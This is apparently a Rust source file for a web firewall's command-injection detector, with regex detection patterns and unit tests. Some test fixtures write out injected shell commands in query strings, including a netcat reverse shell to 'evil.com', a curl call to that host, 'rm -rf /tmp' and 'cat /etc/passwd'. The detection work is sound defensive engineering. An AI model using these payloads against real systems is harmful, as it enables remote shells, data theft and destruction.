//! Command injection detector. Scans query string + request body
//! for shell-shaped patterns: subshell forms (`$()`, backticks,
//! `${}`), pipe-to-shell-cmd, semicolon-shell-cmd, command-chain
//! operators (`&&`, `||`), direct `/bin/sh` invocation, and
//! reverse-shell shapes (`bash -i`, `nc -e`).
//!
//! Mirror of sqli/xss/ssrf shape — regex over the URI string +
//! body bytes (with URL-decode), with field tagging for the audit
//! log. Score 50 (same weight as sqli / xss / ssrf — high-
//! confidence shell-context patterns).
//!
//! ## Why this exists separately from `path_traversal`
//!
//! Pre-2026-05-08 the rule pipeline had no dedicated cmdi class.
//! `$()`, `|`, and backticks fell through every regex set. The
//! AI detector caught most cmdi shapes empirically, but with AI
//! disabled (the standard config post-Run-2 C002 follow-up) the
//! rule-based pipeline missed them entirely. QA Run-4 SEC-M002
//! flagged `?input=test|whoami` and `?arg=$(id)` as undetected.
//!
//! This detector closes that gap with explicit shell-context
//! patterns. Conservative trigger list: shell builtins (`whoami`,
//! `nc`, `cat /etc/passwd`, ...) AFTER a metacharacter, not bare
//! metacharacters — so legit query strings with `|` (regex
//! patterns), `$` (template variables), or `&&` (URL-encoded
//! `&` followed by another param) don't false-positive.

use aegis_core::pipeline::RequestView;
use regex::Regex;
use std::sync::LazyLock;

use super::{Detector, Signal};

/// Stateless command-injection detector.
pub struct CommandInjectionDetector;

static CMDI_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        // Subshell forms: $(cmd), `cmd`, ${cmd}.
        // Conservative — require non-empty content to skip lone
        // `$()` strings that occasionally appear in templates.
        r"(?i)\$\([^)]+\)",
        r"(?i)`[^`]+`",
        r"(?i)\$\{[A-Za-z_][^}]+\}",
        // Pipe-to-shell-cmd: `| whoami`, `| nc -e ...`. The
        // shell-builtin list catches the OWASP cmdi sample set
        // and stays narrow enough to skip bare pipes in regex /
        // base64 / OR-style filter expressions.
        r"(?i)\|\s*(?:whoami|id|uname|cat|ls|nc\b|ncat|netcat|curl|wget|sh\b|bash|zsh|ksh|dash|cmd\.exe|powershell|python|perl|ruby|php|nslookup|ping|rm\b|mv\b|chmod|chown|nc\.exe)\b",
        // Semicolon-shell-cmd: `; whoami`, `; rm -rf /tmp`.
        r"(?i);\s*(?:whoami|id|uname|cat|ls|nc\b|ncat|netcat|curl|wget|sh\b|bash|zsh|ksh|dash|cmd\.exe|powershell|python|perl|ruby|php|nslookup|ping|rm\b|mv\b|chmod|chown|nc\.exe)\b",
        // Logical-AND / logical-OR command chaining.
        r"(?i)(?:&&|\|\|)\s*(?:whoami|id|uname|cat|ls|nc\b|ncat|netcat|curl|wget|sh\b|bash|zsh|ksh|dash|cmd\.exe|powershell|python|perl|ruby|php|nslookup|ping|rm\b|mv\b|chmod|chown)\b",
        // /bin/{sh,bash,zsh,ksh,dash} direct invocation.
        r"(?i)/bin/(?:sh|bash|zsh|ksh|dash)\b",
        // Classic exfil shape — `cat /etc/passwd`. (Distinct
        // from path_traversal's `/etc/passwd` URL-path match —
        // this catches the cmdi shape `;cat /etc/passwd`.)
        r"(?i)cat\s+/etc/passwd",
        // Reverse-shell shapes.
        r"(?i)bash\s+-i\b",
        r"(?i)nc\s+-e\b",
        r"(?i)mkfifo\s+",
        // Wget / curl exfil to attacker hosts when paired with
        // shell-injection context (semicolon, pipe, backtick
        // before the cmd). Overlaps with SSRF on URL surface;
        // this catches the cmdi shape specifically.
        r"(?i)(?:^|;|\|\|?|&&|`|\$\()\s*(?:wget|curl)\s+[a-z]+://",
    ]
    .iter()
    .map(|p| Regex::new(p).expect("cmdi regex compiles"))
    .collect()
});

impl Detector for CommandInjectionDetector {
    fn id(&self) -> &'static str {
        "command_injection"
    }

    fn inspect(&self, req: &RequestView<'_>) -> Vec<Signal> {
        let mut signals = Vec::new();

        // URI surface — both raw and url-decoded so %-encoded
        // payloads (e.g. `%24%28id%29` for `$(id)`) match too.
        let raw_uri = req.uri.to_string();
        let decoded_uri = super::url_decode(&raw_uri);
        check(&raw_uri, "uri", &mut signals);
        check(&decoded_uri, "uri", &mut signals);

        // Body — first 8 KiB, decoded.
        let body = std::str::from_utf8(req.body.peek(8192)).unwrap_or("");
        if !body.is_empty() {
            let decoded_body = super::url_decode(body);
            check(body, "body", &mut signals);
            check(&decoded_body, "body", &mut signals);
        }

        signals
    }
}

fn check(input: &str, field: &str, signals: &mut Vec<Signal>) {
    for re in CMDI_PATTERNS.iter() {
        if re.is_match(input) {
            signals.push(Signal {
                score: 50,
                tag: "command_injection".into(),
                field: field.into(),
            });
            return;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use aegis_core::pipeline::BodyPeek;

    fn view_with_uri(uri: &str) -> (http::Method, http::Uri, http::HeaderMap, BodyPeek) {
        (
            http::Method::GET,
            uri.parse().unwrap(),
            http::HeaderMap::new(),
            BodyPeek::empty(),
        )
    }

    fn make_view<'a>(
        m: &'a http::Method,
        u: &'a http::Uri,
        h: &'a http::HeaderMap,
        b: &'a BodyPeek,
    ) -> RequestView<'a> {
        RequestView {
            method: m,
            uri: u,
            version: http::Version::HTTP_11,
            headers: h,
            peer: "127.0.0.1:1234".parse().unwrap(),
            tls: None,
            body: b,
        }
    }

    macro_rules! positive {
        ($name:ident, $input:expr) => {
            #[test]
            fn $name() {
                let d = CommandInjectionDetector;
                let (m, u, h, b) = view_with_uri($input);
                let req = make_view(&m, &u, &h, &b);
                assert!(
                    !d.inspect(&req).is_empty(),
                    "expected detection for: {}",
                    $input,
                );
            }
        };
    }

    macro_rules! negative {
        ($name:ident, $input:expr) => {
            #[test]
            fn $name() {
                let d = CommandInjectionDetector;
                let (m, u, h, b) = view_with_uri($input);
                let req = make_view(&m, &u, &h, &b);
                assert!(
                    d.inspect(&req).is_empty(),
                    "false positive for: {}",
                    $input,
                );
            }
        };
    }

    // --- QA Run-4 reproductions ---
    positive!(cmdi_pipe_whoami_input,    "/search?input=test|whoami");
    positive!(cmdi_subshell_arg,         "/run?arg=$(id)");
    positive!(cmdi_pipe_q,               "/search?q=test|nc%20-e%20/bin/sh");

    // --- Subshell shapes ---
    positive!(cmdi_backtick,             "/exec?x=`whoami`");
    positive!(cmdi_brace_subshell,       "/exec?x=${PATH}");
    positive!(cmdi_subshell_url_encoded, "/run?x=%24%28id%29");
    positive!(cmdi_backtick_url_encoded, "/run?x=%60whoami%60");

    // --- Chain operators ---
    // (Spaces URL-encoded as %20 so http::Uri accepts them.)
    positive!(cmdi_semicolon_rm,         "/run?cmd=foo;rm%20-rf%20/tmp");
    positive!(cmdi_double_pipe,          "/run?cmd=ls||whoami");
    positive!(cmdi_double_amp,           "/run?cmd=ls&&whoami");
    positive!(cmdi_semicolon_curl,       "/run?cmd=foo;curl%20http://evil.com");

    // --- Direct shell invocation ---
    positive!(cmdi_bin_sh,               "/exec?cmd=/bin/sh%20-c%20id");
    positive!(cmdi_bin_bash,             "/exec?cmd=/bin/bash");
    positive!(cmdi_bash_dash_i,          "/exec?cmd=bash%20-i");
    positive!(cmdi_nc_dash_e,            "/exec?cmd=nc%20-e%20/bin/sh%20evil.com%204444");

    // --- Exfil ---
    positive!(cmdi_cat_passwd,           "/run?cmd=cat%20/etc/passwd");
    positive!(cmdi_mkfifo,               "/run?cmd=mkfifo%20/tmp/p");

    // --- Body ---
    // (URI must be valid; payload lives in query for these.)
    positive!(cmdi_in_body_via_query,    "/api/run?p=foo;whoami");

    // --- Negatives: common FP traps ---
    negative!(clean_root,                "/");
    negative!(clean_query_simple,        "/search?q=hello");
    negative!(clean_pipe_in_regex,       "/api/regex?p=foo|bar");        // bare pipe, no shell builtin after
    negative!(clean_amp_in_query,        "/api?a=1&b=2");
    negative!(clean_semicolon_legacy,    "/api?a=1;b=2");                // legacy ';' separator, no shell cmd
    negative!(clean_base64_padding,      "/api?b=YWJjZA%3D%3D");
    negative!(clean_dollar_var_template, "/api?v=%24user");              // $user (no parens/braces)
    negative!(clean_paren_in_query,      "/api?expr=(a+b)");             // bare parens, no $ prefix
    negative!(clean_path_query,          "/api/v2/users?id=42");
    negative!(clean_static_asset,        "/static/main.js");

    // Edge — `${user.name}` template var. Brace-subshell pattern
    // requires a leading [A-Za-z_], so `${user.name}` matches.
    // Document this is acceptable: legit-looking template vars
    // are rare in URL query strings (they belong in templates,
    // not user input). Operators using template-style variables
    // in URLs can disable this class via /api/detectors.
    positive!(cmdi_brace_var_user_dot,   "/api?v=${user.name}");
}
